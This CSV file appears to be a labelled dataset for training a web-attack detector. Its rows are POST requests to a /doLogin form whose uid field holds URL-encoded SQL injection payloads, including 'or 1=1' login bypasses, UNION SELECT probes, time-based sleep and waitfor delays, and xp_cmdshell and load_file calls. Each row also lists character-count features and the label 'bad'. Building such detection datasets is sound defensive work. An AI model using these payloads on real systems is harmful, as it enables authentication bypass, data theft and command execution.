method,path,body,single_q,double_q,dashes,braces,spaces,percentages,semicolons,angle_brackets,special_chars,path_length,body_length,badwords_count,class
POST,/doLogin,uid=%27%29%29+or+pg_sleep%28__TIME__%29--&passw=fea&btnSubmit=Login,1,0,1,1,2,0,0,0,0,8,57,2,bad
POST,/doLogin,uid=%27%29%29+or+sleep%28__TIME__%29%3D%27&passw=WFAE&btnSubmit=Login,2,0,0,1,2,0,0,0,0,8,55,2,bad
POST,/doLogin,uid=%27%29%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--&passw=Wf&btnSubmit=Login,3,0,1,0,2,0,1,0,0,8,62,3,bad
POST,/doLogin,uid=%27%29+or+%28%27a%27%3D%27a&passw=h&btnSubmit=Login,4,0,0,1,2,0,0,0,0,8,41,1,bad
POST,/doLogin,uid=%27%29+or+%28%27x%27%29%3D%28%27x&passw=sf&btnSubmit=Login,4,0,0,2,2,0,0,0,0,8,44,1,bad
POST,/doLogin,uid=%27%29+or+pg_sleep%28__TIME__%29--&passw=afae&btnSubmit=Login,1,0,1,1,2,0,0,0,0,8,57,2,bad
POST,/doLogin,uid=%27%29+or+sleep%28__TIME__%29%3D%27&passw=asefEF&btnSubmit=Login,2,0,0,1,2,0,0,0,0,8,56,2,bad
POST,/doLogin,uid=%27%3B+exec+master..xp_cmdshell&passw=asf&btnSubmit=Login,1,0,0,0,2,0,1,0,0,8,57,1,bad
POST,/doLogin,uid=%27%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--&passw=WQQFE&btnSubmit=Login,3,0,1,0,2,0,1,0,0,8,64,3,bad
POST,/doLogin,uid=%27%5E%27&passw=cs&btnSubmit=Login,2,0,0,0,0,0,0,0,0,8,32,1,bad
POST,/doLogin,uid=%27+%27&passw=asc&btnSubmit=Login,2,0,0,0,1,0,0,0,0,8,33,1,bad
POST,/doLogin,uid=%27+%28select+top+1&passw=sac&btnSubmit=Login,1,0,0,1,3,0,0,0,0,8,45,2,bad
POST,/doLogin,uid=%27+UNION+ALL+SELECT&passw=sa&btnSubmit=Login,1,0,0,0,3,0,0,0,0,8,47,3,bad
POST,/doLogin,uid=%27+UNION+SELECT&passw=asc&btnSubmit=Login,1,0,0,0,2,0,0,0,0,8,44,3,bad
POST,/doLogin,uid=%27+or+%27%27%26%27&passw=dsv&btnSubmit=Login,4,0,0,0,2,0,0,0,0,8,39,1,bad
POST,/doLogin,uid=%27+or+%27%27%3D%27&passw=asc&btnSubmit=Login,4,0,0,0,2,0,0,0,0,8,39,1,bad
POST,/doLogin,uid=%27+or+%27%27%5E%27&passw=adc&btnSubmit=Login,4,0,0,0,2,0,0,0,0,8,39,1,bad
POST,/doLogin,uid=%27+or+%27%27*%27&passw=dv&btnSubmit=Login,4,0,0,0,2,0,0,0,0,8,38,1,bad
POST,/doLogin,uid=%27+or+%27%27+%27&passw=asc&btnSubmit=Login,4,0,0,0,3,0,0,0,0,8,39,1,bad
POST,/doLogin,uid=%27+or+%27%27-%27&passw=asc&btnSubmit=Login,4,0,0,0,2,0,0,0,0,8,39,1,bad
POST,/doLogin,uid=%27+or+%271%27%3D%271%27--&passw=hb&btnSubmit=Login,5,0,1,0,2,0,0,0,0,8,43,1,bad
POST,/doLogin,uid=%27+or+%27x%27%3D%27x&passw=ad&btnSubmit=Login,4,0,0,0,2,0,0,0,0,8,40,1,bad
POST,/doLogin,uid=%27+or+%28EXISTS%29&passw=sc&btnSubmit=Login,1,0,0,1,2,0,0,0,0,8,42,1,bad
POST,/doLogin,uid=%27+or+1%3D1&passw=X&btnSubmit=Login,1,0,0,0,2,0,0,0,0,8,36,1,bad
POST,/doLogin,uid=%27+or+1%3D1+or+%27%27%3D%27&passw=hj&btnSubmit=Login,4,0,0,0,4,0,0,0,0,8,45,1,bad
POST,/doLogin,uid=%27+or+1%3D1--&passw=hb&btnSubmit=Login,1,0,1,0,2,0,0,0,0,8,39,1,bad
POST,/doLogin,uid=%27+or+1+--%27&passw=hb&btnSubmit=Login,2,0,1,0,3,0,0,0,0,8,39,1,bad
POST,/doLogin,uid=%27+or+3%3D3&passw=asc&btnSubmit=Login,1,0,0,0,2,0,0,0,0,8,38,1,bad
POST,/doLogin,uid=%27+or+a%3Da--&passw=jh&btnSubmit=Login,1,0,1,0,2,0,0,0,0,8,39,1,bad
POST,/doLogin,uid=%27+or+pg_sleep%28__TIME__%29--&passw=asfa&btnSubmit=Login,1,0,1,1,2,0,0,0,0,8,56,2,bad
POST,/doLogin,uid=%27+or+sleep%28__TIME__%29%23&passw=ewwergrg&btnSubmit=Login,1,0,0,1,2,0,0,0,0,8,56,2,bad
POST,/doLogin,uid=%27+or+sleep%28__TIME__%29%3D%27&passw=wer&btnSubmit=Login,2,0,0,1,2,0,0,0,0,8,52,2,bad
POST,/doLogin,uid=%27+or+true--&passw=ac&btnSubmit=Login,1,0,1,0,2,0,0,0,0,8,40,1,bad
POST,/doLogin,uid=%27+or+uid+like+%27%25&passw=a&btnSubmit=Login,2,0,0,0,4,0,0,0,0,8,44,2,bad
POST,/doLogin,uid=%27+or+uname+like+%27%25&passw=ef&btnSubmit=Login,2,0,0,0,4,0,0,0,0,8,47,1,bad
POST,/doLogin,uid=%27+or+uname+like+%27%25&passw=jh&btnSubmit=Login,2,0,0,0,4,0,0,0,0,8,47,1,bad
POST,/doLogin,uid=%27+or+user+like+%27%25&passw=asc&btnSubmit=Login,2,0,0,0,4,0,0,0,0,8,47,1,bad
POST,/doLogin,uid=%27+or+username+like+%27%25&passw=n&btnSubmit=Login,2,0,0,0,4,0,0,0,0,8,49,1,bad
POST,/doLogin,uid=%27-%27&passw=adc&btnSubmit=Login,2,0,0,0,0,0,0,0,0,8,33,1,bad
POST,/doLogin,uid=%27hi%27+or+%27x%27%3D%27x%27%3B&passw=j&btnSubmit=Login,6,0,0,0,2,0,1,0,0,8,44,1,bad
POST,/doLogin,uid=%28%7C%7C6%29&passw=asf&btnSubmit=Login,0,0,0,1,0,0,0,0,0,8,35,1,bad
POST,/doLogin,uid=%28select+top+1&passw=as&btnSubmit=Login,0,0,0,1,2,0,0,0,0,8,42,2,bad
POST,/doLogin,uid=%29%2520or%2520%28%27x%27%3D%27x&passw=dd&btnSubmit=Login,3,0,0,1,0,0,0,0,0,8,45,1,bad
POST,/doLogin,uid=%29%29%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--&passw=af&btnSubmit=Login,2,0,1,0,2,0,1,0,0,8,62,3,bad
POST,/doLogin,uid=%29%29+or+benchmark%2810000000%2CMD5%281%29%29%23&passw=af&btnSubmit=Login,0,0,0,2,2,0,0,0,0,8,62,1,bad
POST,/doLogin,uid=%29%29+or+pg_sleep%28__TIME__%29--&passw=zd&btnSubmit=Login,0,0,1,1,2,0,0,0,0,8,55,2,bad
POST,/doLogin,uid=%29%29+or+sleep%28__TIME__%29%3D%27&passw=as&btnSubmit=Login,1,0,0,1,2,0,0,0,0,8,52,2,bad
POST,/doLogin,uid=%29%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--&passw=ASFAF&btnSubmit=Login,2,0,1,0,2,0,1,0,0,8,64,3,bad
POST,/doLogin,uid=%29%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--&passw=asc&btnSubmit=Login,2,0,1,0,2,0,1,0,0,8,62,3,bad
POST,/doLogin,uid=%29+or+%28%27a%27%3D%27a&passw=aef&btnSubmit=Login,3,0,0,1,2,0,0,0,0,8,42,1,bad
POST,/doLogin,uid=%29+or+%28a%3Da&passw=as&btnSubmit=Login,0,0,0,1,2,0,0,0,0,8,38,1,bad
POST,/doLogin,uid=%29+or+benchmark%2810000000%2CMD5%281%29%29%23&passw=fe&btnSubmit=Login,0,0,0,2,2,0,0,0,0,8,61,1,bad
POST,/doLogin,uid=%29+or+pg_sleep%28__TIME__%29--&passw=hj&btnSubmit=Login,0,0,1,1,2,0,0,0,0,8,54,2,bad
POST,/doLogin,uid=%29+or+sleep%28__TIME__%29%3D%27&passw=afwa&btnSubmit=Login,1,0,0,1,2,0,0,0,0,8,53,2,bad
POST,/doLogin,uid=%29+union+select+*+from+information_schema.tables%3B&passw=asf&btnSubmit=Login,0,0,0,0,5,0,1,0,0,8,78,3,bad
POST,/doLogin,uid=%2F%2F&passw=asf&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,32,1,bad
POST,/doLogin,uid=%2F**%2For%2F**%2F1%2F**%2F%3D%2F**%2F1&passw=aef&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,51,1,bad
POST,/doLogin,uid=%3B+begin+declare+%40var+varchar%288000%29+set+%40var%3D%27+...&passw=gf&btnSubmit=Login,1,0,0,1,7,0,1,0,0,8,78,1,bad
POST,/doLogin,uid=%3B+exec+%28%27sel%27+%2B+%27ect+us%27+%2B+%27er%27%29&passw=as&btnSubmit=Login,6,0,0,1,7,0,1,0,0,8,61,1,bad
POST,/doLogin,uid=%3B+exec+master..xp_cmdshell&passw=aa&btnSubmit=Login,0,0,0,0,2,0,1,0,0,8,55,1,bad
POST,/doLogin,uid=%3B+exec+master..xp_cmdshell+%27ping+172.10.1.255%27--&passw=sf&btnSubmit=Login,2,0,1,0,4,0,1,0,0,8,77,1,bad
POST,/doLogin,uid=%3B+exec+xp_regread&passw=wfa&btnSubmit=Login,0,0,0,0,2,0,1,0,0,8,47,1,bad
POST,/doLogin,uid=%3B+execute+immediate+%27sel%27+%7C%7C+%27ect+us%27+%7C%7C+%27er%27&passw=er&btnSubmit=Login,6,0,0,0,8,0,1,0,0,8,74,1,bad
POST,/doLogin,uid=%3B+or+%271%27%3D%271%27&passw=as&btnSubmit=Login,4,0,0,0,2,0,1,0,0,8,41,1,bad
POST,/doLogin,uid=%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--&passw=AWFAF&btnSubmit=Login,2,0,1,0,2,0,1,0,0,8,63,3,bad
POST,/doLogin,uid=%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--&passw=asc&btnSubmit=Login,2,0,1,0,2,0,1,0,0,8,61,3,bad
POST,/doLogin,uid=%40var+select+%40var+as+var+into+temp+end+--&passw=awf&btnSubmit=Login,0,0,1,0,8,0,0,0,0,8,70,2,bad
POST,/doLogin,uid=%5Cx27UNION+SELECT&passw=sa&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,45,3,bad
POST,/doLogin,uid=%7C%7C%28elt%28-3%2B5%2Cbin%2815%29%2Cord%2810%29%2Chex%28char%2845%29%29%29%29&passw=sf&btnSubmit=Login,0,0,0,6,0,0,0,0,0,8,72,1,bad
POST,/doLogin,uid=%C3%BD+or+1%3D1+--&passw=as&btnSubmit=Login,0,0,1,0,3,0,0,0,0,8,40,1,bad
POST,/doLogin,uid=+%22+or+%22%22+%22&passw=sac&btnSubmit=Login,0,4,0,0,4,0,0,0,0,8,40,1,bad
POST,/doLogin,uid=+%26&passw=sv&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,31,1,bad
POST,/doLogin,uid=+--&passw=aef&btnSubmit=Login,0,0,1,0,1,0,0,0,0,8,33,1,bad
POST,/doLogin,uid=+--+%26password%3D&passw=as&btnSubmit=Login,0,0,1,0,2,0,0,0,0,8,43,1,bad
POST,/doLogin,uid=+UNION+ALL+SELECT&passw=sf&btnSubmit=Login,0,0,0,0,3,0,0,0,0,8,46,3,bad
POST,/doLogin,uid=+UNION+SELECT&passw=a&btnSubmit=Login,0,0,0,0,2,0,0,0,0,8,41,3,bad
POST,/doLogin,uid=+admin%22+or+1%3D1--&passw=asc&btnSubmit=Login,0,1,1,0,3,0,0,0,0,8,46,2,bad
POST,/doLogin,uid=+and+1+in+%28select+var+from+temp%29--&passw=wf&btnSubmit=Login,0,0,1,1,7,0,0,0,0,8,63,2,bad
POST,/doLogin,uid=+group+by+userid+having+1%3D1--&passw=a&btnSubmit=Login,0,0,1,0,5,0,0,0,0,8,57,2,bad
POST,/doLogin,uid=+or+%271%27%3D%271%27--&passw=sac&btnSubmit=Login,4,0,1,0,2,0,0,0,0,8,43,1,bad
POST,/doLogin,uid=+or+%27a%27%3D%27a&passw=af&btnSubmit=Login,3,0,0,0,2,0,0,0,0,8,39,1,bad
POST,/doLogin,uid=+or+%27text%27+%3E+%27t%27&passw=as&btnSubmit=Login,4,0,0,0,4,0,0,1,0,8,45,1,bad
POST,/doLogin,uid=+or+%27whatever%27+in+%28%27whatever%27%29&passw=gchg&btnSubmit=Login,4,0,0,1,4,0,0,0,0,8,61,1,bad
POST,/doLogin,uid=+or+%28EXISTS%29&passw=aeg&btnSubmit=Login,0,0,0,1,2,0,0,0,0,8,42,1,bad
POST,/doLogin,uid=+or+0%3D0+%23&passw=av&btnSubmit=Login,0,0,0,0,3,0,0,0,0,8,38,1,bad
POST,/doLogin,uid=+or+0%3D0+--&passw=asf&btnSubmit=Login,0,0,1,0,3,0,0,0,0,8,40,1,bad
POST,/doLogin,uid=+or+1%2F*&passw=asc&btnSubmit=Login,0,0,0,0,2,0,0,0,0,8,37,1,bad
POST,/doLogin,uid=+or+1%3D1&passw=af&btnSubmit=Login,0,0,0,0,2,0,0,0,0,8,36,1,bad
POST,/doLogin,uid=+or+1%3D1+or+%22%22%3D&passw=hj&btnSubmit=Login,0,2,0,0,4,0,0,0,0,8,43,1,bad
POST,/doLogin,uid=+or+1+--%27&passw=ef&btnSubmit=Login,1,0,1,0,3,0,0,0,0,8,38,1,bad
POST,/doLogin,uid=+or+2+%3E+1a&passw=fa&btnSubmit=Login,0,0,0,0,4,0,0,1,0,8,39,1,bad
POST,/doLogin,uid=+or+2+between+1+and+3&passw=g&btnSubmit=Login,0,0,0,0,6,0,0,0,0,8,49,1,bad
POST,/doLogin,uid=+or+3%3D3&passw=ad&btnSubmit=Login,0,0,0,0,2,0,0,0,0,8,36,1,bad
POST,/doLogin,uid=+or+a%3Da&passw=hj&btnSubmit=Login,0,0,0,0,2,0,0,0,0,8,36,1,bad
POST,/doLogin,uid=+or+a+%3D+a&passw=adcv&btnSubmit=Login,0,0,0,0,4,0,0,0,0,8,40,1,bad
POST,/doLogin,uid=+or+benchmark%2810000000%2CMD5%281%29%29%23&passw=as&btnSubmit=Login,0,0,0,2,2,0,0,0,0,8,60,1,bad
POST,/doLogin,uid=+union+all+select+%40%40version--&passw=aef&btnSubmit=Login,0,0,1,0,4,0,0,0,0,8,59,3,bad
POST,/doLogin,uid=+union+all+select+%40%40version--&passw=vz&btnSubmit=Login,0,0,1,0,4,0,0,0,0,8,58,3,bad
POST,/doLogin,uid=+union+select+*+from+users+where+login+%3D+char+...&passw=sc&btnSubmit=Login,0,0,0,0,10,0,0,0,0,8,78,3,bad
POST,/doLogin,uid=--sp_password&passw=sc&btnSubmit=Login,0,0,1,0,0,0,0,0,0,8,42,1,bad
POST,/doLogin,uid=0&passw=adf&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,31,1,bad
POST,/doLogin,uid=0+or+1%3D1&passw=ad&btnSubmit=Login,0,0,0,0,2,0,0,0,0,8,37,1,bad
POST,/doLogin,uid=0x730065006c0065006300740020004000400076006500+...a&passw=adc&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,81,1,bad
POST,/doLogin,uid=0x770061006900740066006F0072002000640065006C00+...&passw=sdfg&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,81,1,bad
POST,/doLogin,uid=0x77616974666F722064656C61792027303A303A313027+...&passw=g&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,78,1,bad
POST,/doLogin,uid=1%29%29+or+benchmark%2810000000%2CMD5%281%29%29%23&passw=asf&btnSubmit=Login,0,0,0,2,2,0,0,0,0,8,64,1,bad
POST,/doLogin,uid=1%29%29+or+pg_sleep%28__TIME__%29--&passw=aef&btnSubmit=Login,0,0,1,1,2,0,0,0,0,8,57,2,bad
POST,/doLogin,uid=1%29%29+or+pg_sleep%28__TIME__%29--&passw=aefae&btnSubmit=Login,0,0,1,1,2,0,0,0,0,8,59,2,bad
POST,/doLogin,uid=1%29%29+or+sleep%28__TIME__%29%23&passw=SDEFSGE&btnSubmit=Login,0,0,0,1,2,0,0,0,0,8,57,2,bad
POST,/doLogin,uid=1%29%29+or+sleep%28__TIME__%29%23&passw=a&btnSubmit=Login,0,0,0,1,2,0,0,0,0,8,51,2,bad
POST,/doLogin,uid=1%29+or+benchmark%2810000000%2CMD5%281%29%29%23&passw=sf&btnSubmit=Login,0,0,0,2,2,0,0,0,0,8,62,1,bad
POST,/doLogin,uid=1%29+or+pg_sleep%28__TIME__%29--&passw=asf&btnSubmit=Login,0,0,1,1,2,0,0,0,0,8,56,2,bad
POST,/doLogin,uid=1%29+or+pg_sleep%28__TIME__%29--&passw=zdc&btnSubmit=Login,0,0,1,1,2,0,0,0,0,8,56,2,bad
POST,/doLogin,uid=1%29+or+sleep%28__TIME__%29%23&passw=erwgt&btnSubmit=Login,0,0,0,1,2,0,0,0,0,8,54,2,bad
POST,/doLogin,uid=1%29+or+sleep%28__TIME__%29%23&passw=wf&btnSubmit=Login,0,0,0,1,2,0,0,0,0,8,51,2,bad
POST,/doLogin,uid=1%3B%28load_file%28char%2847%2C101%2C116%2C99%2C47%2C112%2C97%2C115%2C+...&passw=aef&btnSubmit=Login,0,0,0,3,1,0,1,0,0,8,80,1,bad
POST,/doLogin,uid=1+or+1%3D1&passw=ad&btnSubmit=Login,0,0,0,0,2,0,0,0,0,8,37,1,bad
POST,/doLogin,uid=1+or+benchmark%2810000000%2CMD5%281%29%29%23&passw=af&btnSubmit=Login,0,0,0,2,2,0,0,0,0,8,61,1,bad
POST,/doLogin,uid=1+or+pg_sleep%28__TIME__%29--&passw=as&btnSubmit=Login,0,0,1,1,2,0,0,0,0,8,54,2,bad
POST,/doLogin,uid=1+or+pg_sleep%28__TIME__%29--&passw=asfa&btnSubmit=Login,0,0,1,1,2,0,0,0,0,8,56,2,bad
POST,/doLogin,uid=1+or+sleep%28__TIME__%29%23&passw=admin&btnSubmit=Login,0,0,0,1,2,0,0,0,0,8,53,3,bad
POST,/doLogin,uid=1+or+sleep%28__TIME__%29%23&passw=afe&btnSubmit=Login,0,0,0,1,2,0,0,0,0,8,51,2,bad
POST,/doLogin,uid=1234+%22+AND+1%3D0+UNION+ALL+SELECT+%22admin%22%2C+&passw=asc&btnSubmit=Login,0,3,0,0,8,0,0,0,0,8,71,4,bad
POST,/doLogin,uid=1234+%27+AND+1%3D0+UNION+ALL+SELECT+%27admin%27%2C+&passw=asc&btnSubmit=Login,3,0,0,0,8,0,0,0,0,8,71,4,bad
POST,/doLogin,uid=21+%25&passw=af&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,33,1,bad
POST,/doLogin,uid=23+OR+1%3D1&passw=da&btnSubmit=Login,0,0,0,0,2,0,0,0,0,8,38,1,bad
POST,/doLogin,uid=PRINT+%40%40variable&passw=afe&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,46,1,bad
POST,/doLogin,uid=a%27&passw=wd&btnSubmit=Login,1,0,0,0,0,0,0,0,0,8,31,1,bad
POST,/doLogin,uid=a%27+or+%27a%27+%3D+%27a&passw=jy&btnSubmit=Login,4,0,0,0,4,0,0,0,0,8,43,1,bad
POST,/doLogin,uid=a%27+or+1%3D1--&passw=jy&btnSubmit=Login,1,0,1,0,2,0,0,0,0,8,40,1,bad
POST,/doLogin,uid=a%27+or+3%3D3--&passw=as&btnSubmit=Login,1,0,1,0,2,0,0,0,0,8,40,1,bad
